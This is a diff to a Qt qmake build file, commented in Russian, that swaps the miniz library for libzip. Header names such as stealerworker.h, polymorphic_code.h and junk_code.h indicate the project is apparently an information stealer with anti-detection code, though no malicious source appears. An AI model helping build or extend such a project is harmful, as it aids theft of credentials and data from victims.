@@ -10,8 +10,7 @@ CONFIG += release
 # Исходные файлы
 SOURCES += \
     $$PWD/../src/main.cpp \
-    $$PWD/mainwindow.cpp \
-    $$PWD/../src/miniz.c
+    $$PWD/mainwindow.cpp
 
 # Заголовочные файлы
 HEADERS += \
@@ -19,8 +18,7 @@ HEADERS += \
     $$PWD/../src/build_key.h \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h \
-    $$PWD/../src/stealerworker.h \
-    $$PWD/../src/miniz.h
+    $$PWD/../src/stealerworker.h
 
 # Формы Qt Designer
 FORMS += \
@@ -38,6 +36,7 @@ INCLUDEPATH += \
 # Библиотеки для линковки
 LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
         -lsqlite3 \
+        -lzip \
         -lz \
         -lbz2 \
         -lcurl \
@@ -119,5 +118,4 @@ PRE_TARGETDEPS += \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h \
     $$PWD/../src/stealerworker.h \
-    $$PWD/../src/miniz.h \
     $$UI_DIR/ui_mainwindow.h
